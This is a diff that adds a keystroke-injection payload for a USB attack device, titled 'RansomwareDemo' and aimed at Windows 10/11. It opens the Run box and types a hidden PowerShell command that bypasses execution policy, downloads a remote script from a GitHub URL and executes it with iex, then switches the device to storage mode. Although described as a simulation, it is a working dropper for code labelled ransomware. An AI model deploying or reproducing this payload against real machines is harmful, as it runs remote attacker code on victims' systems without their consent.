@@ -1,0 +1,24 @@
+REM     Title: RansomwareDemo
+REM     Author: Marco Spies
+REM     Description: This payload simulates a Ransomware attack on a windows machine.
+REM     Target: Windows 10/11
+
+ATTACKMODE HID
+
+REM Run payload
+LED_R
+
+REM Execute Powershell script
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell -w h -NoP -NonI -ep Bypass iex (iwr "https://github.com/V4T3X/RansomwareDemo/raw/main/r.ps1").Content
+ENTER
+
+DELAY 10000
+ATTACKMODE STORAGE
+LED_G
+
+
+- Capslock indikator für ende
+- Windows check
